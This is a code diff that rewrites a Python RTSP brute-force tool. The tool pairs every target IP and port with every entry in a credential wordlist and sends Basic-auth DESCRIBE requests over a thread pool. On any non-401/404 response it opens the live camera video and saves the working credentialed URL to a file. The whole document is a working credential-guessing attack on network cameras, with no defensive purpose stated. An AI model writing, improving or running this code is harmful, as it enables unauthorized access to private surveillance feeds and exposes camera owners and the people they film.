@@ -1,97 +1,116 @@
-import os
-import cv2
-import base64
+import logging
 import socket
-import threading
-import queue
+import base64
+import concurrent.futures
+import itertools
+import argparse
 import time
+import cv2
+from queue import Queue
 from common import cargar_datos, guardar_datos
 
-class RtspBrute:
-    def __init__(self, targets, dictionary_file, pause_duration=1, max_threads=50):
-        self.targets = targets
-        self.dictionary = self.load_dictionary(dictionary_file)
-        self.pause_duration = pause_duration
-        self.max_threads = max_threads if max_threads is not None else len(self.targets)
-        self.q = queue.Queue()
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-    def load_dictionary(self, dictionary_file):
-        with open(dictionary_file, 'r') as f:
-            return [line.strip() for line in f.readlines()]
+class RTSPBruteModule:
+    def __init__(self):
+        self.targets = []
+        self.credentials = []
+        self.pause_duration = 1
+        self.max_threads = 50
+        self.timeout = 5
+        self.seen_urls = set()
+
+    def setup(self, targets, dictionary_file, pause_duration=1, max_threads=50, timeout=5):
+        self.targets = targets
+        self.credentials = self.load_credentials(dictionary_file)
+        self.pause_duration = pause_duration
+        self.max_threads = max_threads
+        self.timeout = timeout
+
+    def load_credentials(self, dictionary_file):
+        try:
+            with open(dictionary_file, 'r') as f:
+                return [line.strip() for line in f.readlines()]
+        except FileNotFoundError:
+            logging.error(f"Dictionary file {dictionary_file} not found.")
+            return []
 
     def run(self):
         total_targets = len(self.targets)
-        print(f"Total targets: {total_targets}")
+        logging.info(f"[*] Total targets: {total_targets}")
 
+        queue = Queue()
+
+        # Add all combinations of targets and credentials to the queue
         for target in self.targets:
-            self.q.put(target)
+            for credential in self.credentials:
+                queue.put((target, credential))
 
-        print(f"Using {self.max_threads} threads")
-        threads = []
-        while not self.q.empty():
-            while len(threads) < self.max_threads and not self.q.empty():
-                t = threading.Thread(target=self.brute_force)
-                t.setDaemon(True)
-                t.start()
-                threads.append(t)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
+            while not queue.empty():
+                executor.submit(self.brute_force, queue.get())
 
-            for t in threads:
-                t.join()
-            threads.clear()
+        logging.info("[*] Finished all threads")
 
-        print("Finished all threads")
-
-    def rtsp_request(self, target, username="", password="", desired_fps=100):
+    def rtsp_request(self, target, credential):
+        ip, port = target
+        passwToBytes = credential.encode('ascii')
+        passwToB64 = base64.b64encode(passwToBytes)
+        passwF = passwToB64.decode('ascii')
+        req = (
+            f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\n"
+            f"CSeq: 2\r\n"
+            f"Authorization: Basic {passwF}\r\n\r\n"
+        )
         try:
-            ip, port = target
-            url = f"rtsp://{username}:{password}@{ip}:{port}/"
-            if self.is_url_already_saved(url):
-                return
-            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "timeout;100"
-            cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
-            cap.set(cv2.CAP_PROP_FPS, desired_fps)
-            if cap.isOpened():
-                print(f"Target: {url}")
-                with open("RTSPCONECT.txt", "a") as file:
-                    file.write(f"{url}\n")
-                while True:
-                    ret, frame = cap.read()
-                    if not ret:
-                        break
-                    if cv2.waitKey(1) & 0xFF == ord('q'):
-                        break
-                cap.release()
-                cv2.destroyAllWindows()
-        except cv2.error:
-            pass
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(self.timeout)
+            s.connect((ip, int(port)))
+            encodereq = req.encode('ascii')
+            s.sendall(encodereq)
+            data = s.recv(1024)
+            response = data.decode('ascii')
+            s.close()
 
-    def is_url_already_saved(self, url):
-        try:
-            with open("RTSPCONECT.txt", "r") as file:
-                for line in file:
-                    if url.strip() == line.strip():
-                        return True
-        except FileNotFoundError:
+            if "401 Unauthorized" not in response and "404 Not Found" not in response:
+                #logging.info(f"Found credentials for {ip}:{port} - {credential}")
+                url = f"rtsp://{credential}@{ip}:{port}/"
+                return self.display_camera(url)
+        except socket.error as e:
             pass
+            #logging.error(f"Error connecting to {ip}:{port} - {e}")
         return False
 
-    def brute_force(self):
-        while not self.q.empty():
-            target = self.q.get()
-            ip, port = target
-            try:
-                datos_filtrados = cargar_datos()
-            except Exception as e:
-                print(f"Error loading data: {e}")
-                continue
-
-            for dato in datos_filtrados:
-                if dato["IP"] == ip and dato["Puerto"] == port:
-                    if dato["Banner"] and dato["Banner"] != "\u001b[31munknown\u001b[0m":
-                        break
+    def display_camera(self, url):
+        cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
+        if cap.isOpened():
+            logging.info(f"Displaying camera stream from {url}")
+            start_time = time.time()
+            while time.time() - start_time < 10:
+                ret, frame = cap.read()
+                if not ret:
                     break
+                if cv2.waitKey(1) & 0xFF == ord('q'):
+                    break
+            cap.release()
+            cv2.destroyAllWindows()
+            self.save_url(url)  # Save the URL only if the stream is successfully displayed
+            return True
+        else:
+            pass
+            #logging.error(f"Failed to open video stream from {url}")
+        return False
 
-            for credential in self.dictionary:
-                username, password = credential.split(':')
-                self.rtsp_request(target, username, password)
-                time.sleep(self.pause_duration)
+    def save_url(self, url):
+        self.seen_urls.add(url)
+        with open("RTSPCONECT.txt", "a") as file:
+            file.write(f"{url}\n")
+
+    def brute_force(self, task):
+        target, credential = task
+        ip, port = target
+        if not self.rtsp_request(target, credential):
+            pass
+            #logging.info(f"Failed login for {ip}:{port} with {credential}")
+        time.sleep(self.pause_duration)
+
